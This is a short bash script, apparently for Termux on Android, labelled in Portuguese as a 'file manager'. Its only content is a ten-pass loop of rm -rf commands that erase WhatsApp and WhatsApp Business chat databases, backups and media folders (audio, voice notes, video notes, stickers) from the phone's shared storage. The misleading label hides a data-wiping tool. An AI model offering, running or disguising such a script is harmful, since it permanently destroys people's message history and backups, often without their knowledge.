#!/bin/bash
#gerenciador de arquivos
#CRIADOR: WILLIAN DE OLIVEIRA

contador=1

while [ $contador -lt 11 ]; do

cd storage/shared/android/media
sleep 1

cd com.whatsapp/WhatsApp
sleep 1
rm -rf "BackUp"
rm -rf "Databases"
sleep 1
cd Media
sleep 1
rm -rf 'WhatsApp Audio'
rm -rf 'WhatsApp Video Notes'
rm -rf 'WhatsApp Voice Notes'
rm -rf 'WhatsApp Stickers'
sleep 1
ls
cd
cd storage/shared/android/media
cd com.whatsapp.w4b
cd 'WhatsApp Business'
sleep 1
rm -rf "BackUp"
rm -rf "Databases"
cd Media
sleep 1
rm -rf 'WhatsApp Business Audio'
rm -rf 'WhatsApp Business Video'
rm -rf 'WhatsApp Business Video Notes'
rm -rf 'WhatsApp Business Stickers'
rm -rf 'WhatsApp Business Voice Notes'
sleep 2
ls
cd
sleep 5

contador=$[$contador + 1]

done
